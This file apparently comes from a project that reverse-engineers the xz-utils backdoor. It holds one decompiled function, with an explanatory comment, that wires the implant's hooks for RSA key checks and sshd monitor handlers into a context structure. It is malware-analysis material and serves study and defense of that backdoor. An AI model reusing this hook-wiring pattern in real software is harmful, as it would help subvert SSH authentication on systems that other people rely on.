// /home/kali/xzre-ghidra/xzregh/1027D0_init_hooks_ctx.c
// Function: init_hooks_ctx @ 0x1027D0
// Calling convention: __stdcall
// Prototype: int __stdcall init_hooks_ctx(backdoor_hooks_ctx_t * ctx)


/*
 * AutoDoc: Initialises the backdoor_hooks_ctx structure with pointers to the implant's hook stubs and shared data slots. backdoor_init_stage2 invokes it as a readiness check and interprets the 0x65 return value as "shared globals not wired yet" so setup can retry safely.
 */
#include "xzre_types.h"


int init_hooks_ctx(backdoor_hooks_ctx_t *ctx)

{
  int iVar1;
  
  iVar1 = 5;
  if (ctx != (backdoor_hooks_ctx_t *)0x0) {
    ctx->hooks_data_addr = (backdoor_hooks_data_t **)&hooks_data;
    iVar1 = 0;
    if (ctx->shared == (backdoor_shared_globals_t *)0x0) {
      ctx->_unknown1632[0] = '\x04';
      ctx->_unknown1632[1] = '\0';
      ctx->_unknown1632[2] = '\0';
      ctx->_unknown1632[3] = '\0';
      ctx->_unknown1632[4] = '\0';
      ctx->_unknown1632[5] = '\0';
      ctx->_unknown1632[6] = '\0';
      ctx->_unknown1632[7] = '\0';
      ctx->symbind64 = (_func_65 *)&LAB_001028d0;
      ctx->hook_RSA_public_decrypt = hook_RSA_public_decrypt;
      ctx->hook_RSA_get0_key = hook_RSA_get0_key;
      ctx->mm_log_handler = mm_log_handler_hook;
      ctx->mm_answer_keyallowed = mm_answer_keyallowed_hook;
      ctx->mm_answer_keyverify = mm_answer_keyverify_hook;
      iVar1 = 0x65;
    }
  }
  return iVar1;
}

